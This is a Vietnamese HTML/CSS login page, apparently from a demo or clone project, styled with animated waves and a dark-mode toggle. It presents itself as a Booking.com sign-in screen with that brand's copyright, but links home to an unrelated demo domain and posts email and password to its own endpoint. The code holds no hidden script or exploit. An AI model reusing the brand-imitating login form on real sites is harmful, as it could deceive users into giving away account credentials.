<style>
  .loptren {
    position: fixed;
    width: 100%;
    height: 100vh;
    z-index: 2;
    top: 0px;
    left: 0px;
  }

  container {
    background: linear-gradient(to top, #1a0b2e 30%, #2d1048);
    color: white;
    height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
    overflow: hidden;
    transition: background 0.5s, color 0.5s;
  }

  .login-container {
    max-width: 420px;
    margin: 10px auto;
    padding: 30px;
    border: 1px solid #fffc41;
    border-radius: 10px;
    box-shadow: 0 4px 12px rgb(234, 255, 116);
    background-color: #fff;
    color: #000;
    transition: background 0.5s, color 0.5s;
  }



  .divider {
    text-align: center;
    margin: 20px 0;
    position: relative;
  }

  .divider::before,
  .divider::after {
    content: "";
    position: absolute;
    top: 50%;
    width: 40%;
    height: 1px;
    background-color: #ccc;
  }

  .divider span {
    background: #fff;
    padding: 0 10px;
    color: #888;
  }

  .social-icons img {
    width: 40px;
    margin: 0 10px;
  }

  .footer-note {
    font-size: 13px;
    color: #777;
  }

  /* 🌊 Waves */
  .wave-container {
    position: absolute;
    bottom: 0;
    width: 100%;
    height: 250px;
    z-index: 1;
    overflow: hidden;
    line-height: 0;
  }

  .wave-container svg {
    position: absolute;
    bottom: 0;
    width: 200%;
    height: 100%;
  }

  .wave1 {
    animation: waveMove 8s linear infinite;
    opacity: 0.7;
  }

  .wave2 {
    animation: waveMoveReverse 12s linear infinite;
    opacity: 0.4;
  }

  .wave3 {
    animation: waveMove 20s linear infinite;
    opacity: 0.2;
  }

  @keyframes waveMove {
    0% {
      transform: translateX(0);
    }

    100% {
      transform: translateX(-50%);
    }
  }

  @keyframes waveMoveReverse {
    0% {
      transform: translateX(-50%);
    }

    100% {
      transform: translateX(0);
    }
  }

  .fade-in {
    opacity: 0;
    transform: translateY(20px);
    animation: fadeIn 1s ease-out forwards;
  }

  .fade-in:nth-child(1) {
    animation-delay: 0s;
  }

  .fade-in:nth-child(2) {
    animation-delay: 0.5s;
  }

  .fade-in:nth-child(3) {
    animation-delay: 1s;
  }

  @keyframes fadeIn {
    to {
      opacity: 1;
      transform: translateY(0);
    }
  }

  .khung_lon {
    z-index: 12;
  }

  /* Dark Mode */
  body.dark-mode {
    background: #ffffff;
    color: #fff;
  }

  .dark-mode .login-container {
    background-color: #1e1e2f;
    color: #fff;
    border: 1px solid #00c3ff;
    box-shadow: 0 4px 12px hsla(290, 100%, 50%, 0.502);
  }

  .dark-mode .divider span {
    background: #1e1e2f;
    color: #aaa;
  }

  .dark-mode .footer-note {
    color: #aaa;
  }

  .toggle-btn {
    position: absolute;
    top: 20px;
    right: 20px;
    background: transparent;
    border: none;
    font-size: 24px;
    cursor: pointer;
    z-index: 999;
  }

  /* Background circles */
  .circle {
    position: absolute;
    border-radius: 50%;
    /* filter: blur(100px); */
    /* opacity: 1; */
    z-index: 0;
  }

  .circle1 {
    width: 400px;
    height: 400px;
    top: -100px;
    left: -200px;
    background: #ff00ff;
    animation: float1 10s ease-in-out infinite;
  }

  .circle2 {
    width: 500px;
    height: 500px;
    bottom: -150px;
    right: -150px;
    background: #00ffff;
    animation: float2 12s ease-in-out infinite;
  }

  /* Animation cho circle */
  @keyframes float1 {
    0% {
      transform: translate(0, 0) scale(1);
    }

    50% {
      transform: translate(30px, 20px) scale(1.1);
    }

    100% {
      transform: translate(0, 0) scale(1);
    }
  }

  @keyframes float2 {
    0% {
      transform: translate(0, 0) scale(1);
    }

    50% {
      transform: translate(-20px, 25px) scale(0.9);
    }

    100% {
      transform: translate(0, 0) scale(1);
    }
  }
</style>


<div class="container-fluid">
  <div class="row overflow-hidden">
    <div class="col-12 position-relative" style="height: 100vh;">
      <!-- hieu ung -->

      <!-- 🌊 Waves SVG -->
      <div class="wave-container">
        <svg class="wave1" viewBox="0 0 1200 120" preserveAspectRatio="none">
          <path d="M0,32 C300,80 900,0 1200,32 L1200,120 L0,120 Z" fill="#a300ff" />
        </svg>
        <svg class="wave2" viewBox="0 0 1200 120" preserveAspectRatio="none">
          <path d="M0,32 C300,100 900,0 1200,32 L1200,120 L0,120 Z" fill="#4a00e0" />
        </svg>
        <svg class="wave3" viewBox="0 0 1200 120" preserveAspectRatio="none">
          <path d="M0,32 C300,60 900,20 1200,32 L1200,120 L0,120 Z" fill="#4a00e0" />
        </svg>
      </div>

      <!-- Background circles -->
      <div class="circle circle1"></div>
      <div class="circle circle2"></div>



      <!-- end hieu ung -->

    </div>

  </div>





</div>
<div class="loptren">

  <div class="container-lg">
    <div class="row">
      <div class="col-12 col-md-12 ">
        <div class="fade-in khung_lon">
          <div class="login-container bg-white mb-3">
            <h5 class="fw-bold text-center mb-3 text-dark">ĐĂNG NHẬP HOẶC TẠO TÀI KHOẢN</h5>
            <p class="text-center text-muted small">Bạn có thể đăng nhập tài khoản Booking.com của mình để truy cập các dịch vụ của chúng tôi.</p>
            <form method="post" action="login/check_login">
              <div class="mb-3">
                <label for="email" class="form-label fw-bold text-dark">Địa chỉ email</label>
                <input type="email" class="form-control" id="email" name="email" placeholder="Nhập địa chỉ email của bạn" required>
              </div>
              <div class="mb-3">
                <label for="password" class="form-label fw-bold text-dark">Mật khẩu</label>
                <input type="password" class="form-control" id="password" name="password" placeholder="Nhập mật khẩu" required>
              </div>

              <!-- Nút Đăng nhập căn giữa -->
              <div class="text-center">
                <input type="submit" name="submit" value="🔐 Đăng nhập" class="btn btn-primary rounded-pill px-4" />
              </div>

              <div class="d-flex justify-content-center align-items-center gap-2 mt-3">
                <span class="text-muted">Đăng nhập với</span>
                <a class="me-3"><img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/Facebook_icon.svg" alt="Facebook" width="32">
                </a>
                <a><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 48 48">
                    <path fill="#EA4335" d="M24 9.5c3.12 0 5.94 1.09 8.15 2.89l6.1-6.1C34.75 2.77 29.64 0 24 0 14.96 0 7.16 5.8 3.3 14.17l7.84 6.1C13 13.29 18.1 9.5 24 9.5z" />
                    <path fill="#34A853" d="M46.14 24.55c0-1.63-.14-3.2-.39-4.72H24v9h12.55c-.54 2.9-2.16 5.37-4.54 7.07l7.12 5.56c4.15-3.83 6.54-9.48 6.54-15.91z" />
                    <path fill="#FBBC05" d="M10.27 28.27a14.57 14.57 0 0 1 0-8.54L2.43 13.63a24.015 24.015 0 0 0 0 20.75l7.84-6.1z" />
                    <path fill="#4285F4" d="M24 48c6.48 0 11.92-2.14 15.89-5.81l-7.12-5.56C30.96 38.11 27.71 39.5 24 39.5c-5.9 0-11-3.79-12.86-9.27l-7.84 6.1C7.16 42.2 14.96 48 24 48z" />
                  </svg>
                </a>
              </div>

              <!-- Nếu chưa có tài khoản + Đăng ký -->
              <div class="d-flex justify-content-center align-items-center gap-2 mt-3">
                <span class="text-muted">Bạn chưa có tài khoản?</span>
                <a href="logon" class="btn btn-outline-primary btn-sm rounded-pill px-4">Đăng ký</a>
              </div>

              <!-- Trở về trang chủ -->
              <div class="text-center mt-2">
                <a href="https://demob.tgsoft.vn" class="btn btn-info btn-sm rounded-pill px-4"><i class="bi bi-house-door-fill text-white" style="font-size: 25px;"></i></a>
              </div>
            </form>

            <br>

            <p class="text-center footer-note mt-4">
              Qua việc đăng nhập hoặc tạo tài khoản, bạn đồng ý với các
              <a href="#" style="text-decoration: none;">Điều khoản và Điều kiện</a> cũng như
              <a href="#" style="text-decoration: none;">Chính sách An toàn và Bảo mật</a> của chúng tôi.
            </p>

            <p class="text-center footer-note mt-2">
              Bản quyền © 2006 - 2025 - Booking.com™
            </p>
          </div>
        </div>
      </div>
    </div>

  </div>
</div>






<script>
  function toggleDarkMode() {
    document.body.classList.toggle('dark-mode');
    const btn = document.querySelector('.toggle-btn');
    btn.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
  }
</script>